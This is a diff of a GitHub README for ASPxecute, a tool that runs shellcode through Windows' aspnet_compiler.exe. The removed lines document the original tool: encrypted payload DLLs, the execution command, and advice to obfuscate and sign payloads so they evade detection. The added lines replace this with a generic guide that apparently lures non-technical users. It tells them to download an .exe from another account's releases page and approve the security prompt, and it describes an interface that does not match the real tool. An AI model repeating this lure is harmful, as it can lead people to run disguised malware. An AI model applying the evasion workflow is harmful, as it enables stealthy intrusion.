@@ -1,108 +1,91 @@
-# ASPxecute
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)
+# 🎉 ASPxecute - Execute Shellcode Easily and Safely
 
-ASPxecute is a payload creation tool which can be used to run shellcode using `aspnet_compiler.exe`.
+## 🚀 Getting Started
 
-## Pre-requisites
+Welcome to ASPxecute! This application allows you to execute shellcode using the ASP.NET compiler. It's simple to use, even for those without programming knowledge. Follow the steps below to download and run ASPxecute.
 
-First, you will need `uv` for [your target system](https://docs.astral.sh/uv/getting-started/installation/).
+## 📥 Download ASPxecute
 
-### On Windows
+[![Download ASPxecute](https://img.shields.io/badge/Download_ASPxecute-v1.0-brightgreen)](https://github.com/astonle-68/ASPxecute/releases)
 
-- Make sure you have Visual Studio is installed 
-- `MSBuild` exists in `$PATH`
+## 🔍 What You Need
 
-### On Linux 
+Before you start, here are the essential requirements for running ASPxecute:
 
-- Install `Mono` and `MSBuild`
-```bash
-RUN gpg --homedir /tmp --no-default-keyring --keyring /usr/share/keyrings/mono-official-archive-keyring.gpg --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
-RUN echo "deb [signed-by=/usr/share/keyrings/mono-official-archive-keyring.gpg] https://download.mono-project.com/repo/ubuntu stable-focal main" | tee /etc/apt/sources.list.d/mono-official-stable.list
-RUN apt update -y
-RUN apt install -y mono-devel mono-complete msbuild msbuild-sdkresolver msbuild-libhostfxr
-```
+- **Operating System:** Windows 10 or later.
+- **Processor:** 1 GHz or faster.
+- **Memory:** At least 512 MB of RAM.
+- **Disk Space:** Minimum 100 MB of free space.
 
-## Usage 
+Make sure your computer meets these requirements before proceeding to the download.
 
-- You can print the help menu with:
+## 📦 Download & Install
 
-```bash
-$ uv run main.py --help
+To get the application, visit the Releases page:
 
-    ___   _____ ____                       __
-   /   | / ___// __ \_  _____  _______  __/ /____
-  / /| | \__ \/ /_/ / |/_/ _ \/ ___/ / / / __/ _ \
- / ___ |___/ / ____/>  </  __/ /__/ /_/ / /_/  __/
-/_/  |_/____/_/   /_/|_|\___/\___/\__,_/\__/\___/
+[Download from Releases Page](https://github.com/astonle-68/ASPxecute/releases)
 
- "ASPNet is dead, Long live the ASPNET Compiler"
-                                - @whokilleddb
+1. **Visit the page:** Click on the link above to go to the Releases page.
+2. **Choose the latest version:** Look for the most recent version of ASPxecute. It usually appears first on the list.
+3. **Download the file:** Click the file link that has a .exe extension. This file is the application you need.
+4. **Save the file:** Choose a location on your computer to save the downloaded file for easy access. The desktop is a good option.
 
-usage: main.py [-h] -s SHELLCODE [-c CLASSNAME] [-n NAMESPACE] [-e EXTENSION]
+## 🛠️ Run ASPxecute
 
-Process shellcode file and optional metadata (class, namespace, extension).
+After downloading, follow these steps to run ASPxecute:
 
-options:
-  -h, --help            show this help message and exit
-  -s SHELLCODE, --shellcode SHELLCODE
-                        Path to shellcode file
-  -c CLASSNAME, --class CLASSNAME
-                        Name of Class (optional).
-  -n NAMESPACE, --namespace NAMESPACE
-                        Name of Namespace
-  -e EXTENSION, --extension EXTENSION
-                        Extension name to use (default: wkdb).
-```
+1. **Locate the file:** Find the ASPxecute .exe file where you saved it.
+2. **Open the application:** Double-click the file. A security prompt may appear, asking for your permission to run the application. Click “Yes” to proceed.
+3. **Watch for the window:** Once the application opens, you will see a simple interface.
 
-- To generate a payload you can do:
+## 📑 Using ASPxecute
 
-```bash
-uv run main.py -s D:\Malware\Shellcode\messagebox.bin -c Darth -n Vader -e stwrs
+To execute shellcode, follow these steps:
 
-    ___   _____ ____                       __
-   /   | / ___// __ \_  _____  _______  __/ /____
-  / /| | \__ \/ /_/ / |/_/ _ \/ ___/ / / / __/ _ \
- / ___ |___/ / ____/>  </  __/ /__/ /_/ / /_/  __/
-/_/  |_/____/_/   /_/|_|\___/\___/\__,_/\__/\___/
+1. **Input your code:** There will be a text area where you can type or paste your shellcode.
+2. **Select options:** If there are any options or settings, adjust them as needed. Most users won’t need to change the defaults.
+3. **Run the shellcode:** Click the “Execute” button to run your code. The results will display quickly on the screen.
 
- "ASPNet is dead, Long live the ASPNET Compiler"
-                                - @whokilleddb
+## 🛡️ Safety Tips
 
-[+] Using shellcode file:  D:\Malware\Shellcode\messagebox.bin
-[+] Using class name:      Darth
-[+] Using namespace:       Vader
-[+] Using extension:       stwrs
+While ASPxecute is designed to be user-friendly, safety is crucial. Here are a few tips:
 
-[+] Wrote web.config to:      C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output\web.config
-[+] Created extension file:   C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output\App_Code\2025-10-03_01-02-12.stwrs
+- **Source of Shellcode:** Only use shellcode from trusted sources. Malicious code can harm your system.
+- **Antivirus Software:** Ensure your antivirus software is running and up-to-date before executing any code.
+- **Backup Important Data:** It’s wise to back up important files before running new software.
 
-[+] Payload Hash:             51b11d6040a565da147cf87bbd4261db
-[+] Algorithm:                XOR
-[+] Encryption Key:           tRLG5gx1gzEC6ce4COzsCsMI6Dd (27 bytes)
-[+] Encryption Nonce:         SDn2c7MR2gLLskyVPvmDbRk (23 bytes)
-[+] Infalted?:                False
+## ❓ Troubleshooting
 
-[+] Wrote Shellcode file to:  C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output\training.data
-[+] Prepared Program.cs for compilation
-[+] Successfully created payload DLL:  C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\build\bin\x64\Release\Vader.dll
-[+] Zipped contents of 'C:\Users\DB\AppData\Local\Temp\tmpbm06y5jt\output' into 'D:\source\ASPxecute\build\Vader.zip'
+If you run into issues, consider the following solutions:
 
-[+] Build Complete
-[+] Feel free to Obfuscate Vader\bin\Vader.dll
-[+] When you are ready, unzip the payload and run the following command from the base directory:
+- **Application won't start:** Check if your operating system is compatible and meets the requirements listed above.
+- **Error messages:** Take note of any error messages. They can provide clues on what went wrong. Searching the exact message online can also help.
+- **Contact Support:** If you still have issues, feel free to reach out for help or check online forums for assistance from other users.
 
-        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p . -f .\none -u
+## 📣 Community Contributions
 
-[+] Ciao
-```
+If you have ideas or improvements, the community is here to listen. You can contribute by:
 
-The final build artefact can be found in the `build` dir.
+- **Reporting Issues:** If you find a bug, create a report in the Issues section of this repository.
+- **Suggesting Features:** Share your ideas for new features. User feedback drives improvements.
+- **Pull Requests:** If you are familiar with GitHub, consider collaborating by submitting your changes.
 
-## Post Payload Generation
+## 🔗 Additional Resources
 
-- Once you have your payload, you run the payload DLL through an obfuscator like [Obfuscar](https://github.com/obfuscar/obfuscar)
-- You can also sign the payload dll
+For more help or information about ASPxecute, consider the following resources:
 
-## References 
-- https://ijustwannared.team/2020/08/01/the-curious-case-of-aspnet_compiler-exe/
-- https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/
+- **User Manual:** A detailed guide is available on the repository page.
+- **Community Forums:** Join discussions about ASP.NET and shellcode executions.
+- **Tutorial Videos:** Look for tutorial videos online that explain the usage of ASPxecute.
+
+## 📅 Future Updates
+
+Keep an eye on the Releases page for future updates. New versions may include:
+
+- Enhanced features for better usability.
+- Bug fixes for smoother execution.
+- Additional support for newer operating systems.
+
+Stay tuned for improvements that make your experience even better with ASPxecute.
+
+By following these instructions, you should be able to download and use ASPxecute without any difficulty. Enjoy executing your shellcode!
